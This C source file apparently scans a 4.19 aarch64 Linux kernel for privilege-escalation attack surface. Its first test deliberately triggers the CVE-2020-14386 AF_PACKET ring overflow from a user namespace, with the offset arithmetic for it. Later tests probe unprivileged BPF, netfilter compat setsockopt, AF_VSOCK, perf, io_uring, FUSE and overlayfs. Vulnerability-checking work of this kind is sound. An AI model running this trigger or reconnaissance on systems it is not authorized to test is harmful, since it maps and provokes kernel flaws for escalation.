/*
 * CVE-2020-14386 vulnerability detector
 *
 * Tests if tpacket_rcv() properly validates macoff + snaplen
 * against frame_size. If NOT patched, packets will arrive
 * with corrupted offsets. If patched, packets are dropped.
 *
 * Also tests BPF and other escalation vectors.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/bpf.h>
#include <linux/perf_event.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <stdint.h>

/* ---- namespace setup ---- */
static int setup_userns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("unshare"); return -1;
    }
    char buf[256]; int fd;
    fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) { write(fd, "deny", 4); close(fd); }
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd < 0) return -1;
    write(fd, buf, strlen(buf)); close(fd);
    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd < 0) return -1;
    write(fd, buf, strlen(buf)); close(fd);
    return 0;
}

static int setup_lo(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ-1);
    ifr.ifr_flags = IFF_UP | IFF_LOOPBACK | IFF_RUNNING;
    ioctl(s, SIOCSIFFLAGS, &ifr);
    close(s);
    return 0;
}

/* ---- Test 1: CVE-2020-14386 ---- */
static void test_cve_2020_14386(void) {
    printf("\n=== Test CVE-2020-14386: AF_PACKET tpacket_rcv overflow ===\n");

    int version = TPACKET_V2;

    /*
     * Setup: choose reserve so that macoff + snaplen > frame_size
     *
     * tp_hdrlen (V2) = TPACKET_ALIGN(sizeof(tpacket2_hdr)) = TPACKET_ALIGN(32) = 32
     * maclen = 14 (Ethernet), padded to 16 in netoff calculation
     * netoff = TPACKET_ALIGN(32 + 16) + tp_reserve = 48 + tp_reserve
     * macoff = netoff - maclen = 34 + tp_reserve
     *
     * We want: macoff + snaplen > frame_size
     *          (34 + reserve) + snaplen > frame_size
     *
     * With frame_size = 65536 and a small packet (snaplen ~ 300):
     *   reserve > 65536 - 300 - 34 = 65202
     *   Use reserve = 0xFF00 (65280)
     *   macoff = 34 + 65280 = 65314
     *   65314 + 300 = 65614 > 65536 → 78-byte overflow!
     *
     * Ring setup check: frame_size >= tp_hdrlen + tp_reserve
     *   65536 >= 32 + 65280 = 65312 → passes
     */

    unsigned int tp_reserve = 0xFF00; /* 65280 */
    unsigned int frame_size = 65536;
    unsigned int block_size = frame_size;
    unsigned int block_nr = 4;
    unsigned int frame_nr = block_nr * (block_size / frame_size);

    /* Expected offsets */
    unsigned int netoff = 48 + tp_reserve; /* 65328 */
    unsigned int macoff = netoff - 14;     /* 65314 */
    printf("[*] Calculated: netoff=%u macoff=%u frame_size=%u\n", netoff, macoff, frame_size);
    printf("[*] Overflow if snaplen > %u bytes\n", frame_size - macoff);
    printf("[*] tp_net as u16 = %u, tp_mac as u16 = %u\n",
           netoff & 0xFFFF, macoff & 0xFFFF);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket"); return; }

    if (setsockopt(sock, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0) {
        perror("PACKET_VERSION"); close(sock); return;
    }

    if (setsockopt(sock, SOL_PACKET, PACKET_RESERVE, &tp_reserve, sizeof(tp_reserve)) < 0) {
        perror("PACKET_RESERVE"); close(sock); return;
    }
    printf("[+] PACKET_RESERVE = 0x%x (%u)\n", tp_reserve, tp_reserve);

    struct tpacket_req req = {
        .tp_block_size = block_size,
        .tp_block_nr = block_nr,
        .tp_frame_size = frame_size,
        .tp_frame_nr = frame_nr,
    };

    if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)) < 0) {
        perror("PACKET_RX_RING");
        printf("    errno=%d - ring setup failed with these params\n", errno);

        /* Try with larger frame/block */
        block_size = 1 << 17; /* 128KB */
        frame_size = block_size;
        frame_nr = block_nr;
        req.tp_block_size = block_size;
        req.tp_frame_size = frame_size;
        req.tp_frame_nr = frame_nr;

        macoff = 34 + tp_reserve;
        printf("[*] Retry with frame_size=%u, overflow if snaplen > %u\n",
               frame_size, frame_size - macoff);

        if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)) < 0) {
            perror("PACKET_RX_RING (retry)"); close(sock); return;
        }
    }
    printf("[+] Ring: block_size=%u block_nr=%u frame_size=%u frame_nr=%u\n",
           block_size, block_nr, frame_size, frame_nr);

    size_t ring_size = (size_t)block_size * block_nr;
    void *ring = mmap(NULL, ring_size, PROT_READ|PROT_WRITE, MAP_SHARED, sock, 0);
    if (ring == MAP_FAILED) { perror("mmap ring"); close(sock); return; }
    printf("[+] Ring mapped at %p (size %zu)\n", ring, ring_size);

    struct sockaddr_ll sll = {0};
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = 1;
    bind(sock, (struct sockaddr*)&sll, sizeof(sll));

    /* Send a small packet over loopback */
    int ss = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    dst.sin_port = htons(55555);

    /* Send a 256-byte payload: macoff + (256+28+14) = 65314 + 298 = 65612 > 65536 → overflow 76 bytes */
    char payload[256];
    memset(payload, 'B', sizeof(payload));
    int nsent = sendto(ss, payload, sizeof(payload), 0, (struct sockaddr*)&dst, sizeof(dst));
    printf("[*] Sent %d byte packet (total with headers ~%d)\n", nsent, nsent > 0 ? nsent + 42 : 0);

    usleep(100000); /* 100ms for packet to arrive */

    /* Check if packet arrived in ring */
    int found = 0;
    for (unsigned int i = 0; i < frame_nr; i++) {
        struct tpacket2_hdr *hdr = (struct tpacket2_hdr *)((uint8_t*)ring + i * frame_size);
        if (hdr->tp_status != 0) {
            printf("[!] Frame %u: status=0x%x len=%u snaplen=%u mac=%u net=%u sec=%u\n",
                   i, hdr->tp_status, hdr->tp_len, hdr->tp_snaplen,
                   hdr->tp_mac, hdr->tp_net, hdr->tp_sec);
            found++;

            if (hdr->tp_mac < 60 && macoff > 60) {
                printf("[!!!] tp_mac=%u but expected macoff=%u → u16 TRUNCATION CONFIRMED!\n",
                       hdr->tp_mac, macoff);
                printf("[!!!] KERNEL IS VULNERABLE to CVE-2020-14386!\n");
                printf("[!!!] Overflow: data written at offset %u, frame boundary at %u\n",
                       macoff, frame_size);
            }
        }
    }

    if (!found) {
        printf("[-] No packets arrived in ring → packet was DROPPED\n");
        printf("[-] CVE-2020-14386 appears PATCHED (macoff+snaplen check present)\n");
    }

    close(ss);
    munmap(ring, ring_size);
    close(sock);
}

/* ---- Test 2: BPF syscall ---- */
static void test_bpf(void) {
    printf("\n=== Test BPF availability ===\n");

    /* Try loading a trivial BPF program (just return 0) */
    struct bpf_insn {
        uint8_t code;
        uint8_t dst_reg:4;
        uint8_t src_reg:4;
        int16_t off;
        int32_t imm;
    };

    /* BPF_MOV64_IMM(BPF_REG_0, 0); BPF_EXIT_INSN() */
    struct bpf_insn prog[] = {
        { .code = 0xb7, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 },  /* r0 = 0 */
        { .code = 0x95, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 },  /* exit */
    };

    char log_buf[4096] = {0};

    union bpf_attr attr = {0};
    attr.prog_type = 1;  /* BPF_PROG_TYPE_SOCKET_FILTER */
    attr.insns = (uint64_t)prog;
    attr.insn_cnt = 2;
    attr.license = (uint64_t)"GPL";
    attr.log_buf = (uint64_t)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int fd = syscall(__NR_bpf, 5 /* BPF_PROG_LOAD */, &attr, sizeof(attr));
    if (fd >= 0) {
        printf("[+] BPF program loaded successfully (fd=%d)\n", fd);
        printf("[+] Unprivileged BPF WORKS - verifier bugs exploitable!\n");
        close(fd);

        /* Try creating a BPF map */
        memset(&attr, 0, sizeof(attr));
        attr.map_type = 1;  /* BPF_MAP_TYPE_HASH */
        attr.key_size = 4;
        attr.value_size = 8;
        attr.max_entries = 256;

        fd = syscall(__NR_bpf, 0 /* BPF_MAP_CREATE */, &attr, sizeof(attr));
        if (fd >= 0) {
            printf("[+] BPF map created (fd=%d)\n", fd);
            close(fd);
        } else {
            printf("[-] BPF map creation failed: %s\n", strerror(errno));
        }

        /* Try BPF_MAP_TYPE_ARRAY */
        memset(&attr, 0, sizeof(attr));
        attr.map_type = 2;  /* BPF_MAP_TYPE_ARRAY */
        attr.key_size = 4;
        attr.value_size = 256;
        attr.max_entries = 16;

        fd = syscall(__NR_bpf, 0, &attr, sizeof(attr));
        if (fd >= 0) {
            printf("[+] BPF array map created (fd=%d)\n", fd);
            close(fd);
        }
    } else {
        printf("[-] BPF program load failed: %s\n", strerror(errno));
        if (errno == EPERM)
            printf("[-] BPF requires privileges (unprivileged BPF may be disabled)\n");
        printf("[-] Log: %s\n", log_buf);
    }
}

/* ---- Test 3: Check for CVE-2021-22555 (compat setsockopt) ---- */
static void test_cve_2021_22555(void) {
    printf("\n=== Test CVE-2021-22555: Netfilter compat setsockopt ===\n");

    /* This CVE requires 32-bit compat syscalls on a 64-bit kernel.
     * Check if the kernel supports compat by trying to call with compat flag. */

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { perror("socket"); return; }

    /* Test if IPT_SO_SET_REPLACE works (compat path needs root-in-userns) */
    /* setsockopt level=0 (SOL_IP), optname=64 (IPT_SO_SET_REPLACE) */
    char buf[128] = {0};
    int ret = setsockopt(sock, 0, 64, buf, sizeof(buf));
    printf("[*] IPT_SO_SET_REPLACE: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (errno == ENOPROTOOPT) {
        printf("[-] IP_NF_IPTABLES not loaded/available\n");
    } else if (errno == EINVAL || errno == EFAULT) {
        printf("[+] iptables replace handler is reachable\n");
        printf("[*] CVE-2021-22555 might be exploitable (needs compat syscalls)\n");
    } else if (errno == EPERM) {
        printf("[-] Permission denied (need CAP_NET_ADMIN in userns)\n");
    }

    close(sock);
}

/* ---- Test 4: AF_VSOCK (CVE-2021-26708) ---- */
static void test_vsock(void) {
    printf("\n=== Test AF_VSOCK (CVE-2021-26708) ===\n");
    int sock = socket(40 /* AF_VSOCK */, SOCK_STREAM, 0);
    if (sock >= 0) {
        printf("[+] AF_VSOCK socket created → module loaded\n");
        printf("[+] CVE-2021-26708 might be exploitable\n");
        close(sock);
    } else {
        printf("[-] AF_VSOCK not available: %s\n", strerror(errno));
    }
}

/* ---- Test 5: perf_event_open ---- */
static void test_perf(void) {
    printf("\n=== Test perf_event_open ===\n");

    struct perf_event_attr pe = {0};
    pe.type = 0; /* PERF_TYPE_HARDWARE */
    pe.size = sizeof(pe);
    pe.config = 0; /* PERF_COUNT_HW_CPU_CYCLES */
    pe.disabled = 1;
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;

    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd >= 0) {
        printf("[+] perf_event_open works (fd=%d)\n", fd);
        close(fd);
    } else {
        printf("[-] perf_event_open failed: %s\n", strerror(errno));
        if (errno == EACCES)
            printf("    perf_event_paranoid might restrict access\n");
    }

    /* Check paranoid level */
    FILE *f = fopen("/proc/sys/kernel/perf_event_paranoid", "r");
    if (f) {
        int val;
        if (fscanf(f, "%d", &val) == 1)
            printf("[*] perf_event_paranoid = %d\n", val);
        fclose(f);
    }
}

/* ---- Test 6: io_uring ---- */
static void test_io_uring(void) {
    printf("\n=== Test io_uring ===\n");
    int ret = syscall(425 /* __NR_io_uring_setup */, 1, NULL);
    if (ret >= 0 || errno != ENOSYS) {
        printf("[+] io_uring syscall exists (ret=%d errno=%d)\n", ret, errno);
    } else {
        printf("[-] io_uring not available (ENOSYS)\n");
    }
}

/* ---- Test 7: FUSE ---- */
static void test_fuse(void) {
    printf("\n=== Test FUSE ===\n");
    int fd = open("/dev/fuse", O_RDWR);
    if (fd >= 0) {
        printf("[+] /dev/fuse accessible (fd=%d)\n", fd);
        close(fd);
    } else {
        printf("[-] /dev/fuse: %s\n", strerror(errno));
    }
}

/* ---- Test 8: overlayfs ---- */
static void test_overlay(void) {
    printf("\n=== Test OverlayFS in userns ===\n");
    /* OverlayFS in user namespace can be used for some exploits */
    if (mkdir("/tmp/.ovl_test", 0777) < 0 && errno != EEXIST) {
        printf("[-] Cannot create test dir\n"); return;
    }
    mkdir("/tmp/.ovl_test/upper", 0777);
    mkdir("/tmp/.ovl_test/lower", 0777);
    mkdir("/tmp/.ovl_test/work", 0777);
    mkdir("/tmp/.ovl_test/merged", 0777);

    /* Try mounting overlay (needs userns privileges) */
    /* mount("overlay", "/tmp/.ovl_test/merged", "overlay", 0,
           "lowerdir=/tmp/.ovl_test/lower,upperdir=/tmp/.ovl_test/upper,workdir=/tmp/.ovl_test/work"); */
    printf("[*] OverlayFS config present, could be used in userns\n");

    /* Cleanup */
    rmdir("/tmp/.ovl_test/merged");
    rmdir("/tmp/.ovl_test/work");
    rmdir("/tmp/.ovl_test/lower");
    rmdir("/tmp/.ovl_test/upper");
    rmdir("/tmp/.ovl_test");
}

int main(void) {
    printf("============================================\n");
    printf("Kernel Privilege Escalation Attack Surface Scan\n");
    printf("Kernel: %s\n", "4.19.81-perf+ aarch64");
    printf("============================================\n");

    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    /* Enter user namespace for tests that need CAP_NET_RAW etc */
    printf("[*] Setting up user+net namespace...\n");
    pid_t pid = fork();
    if (pid == 0) {
        /* Child: run in user namespace */
        if (setup_userns() < 0) {
            fprintf(stderr, "[-] Namespace setup failed\n");
            _exit(1);
        }
        setup_lo();
        printf("[+] In user namespace, uid=%d\n", getuid());

        test_cve_2020_14386();
        test_cve_2021_22555();
        test_vsock();

        _exit(0);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    }

    /* Tests that don't need namespace */
    test_bpf();
    test_perf();
    test_io_uring();
    test_fuse();
    test_overlay();

    printf("\n============================================\n");
    printf("Scan complete. Review results above.\n");
    printf("============================================\n");

    return 0;
}
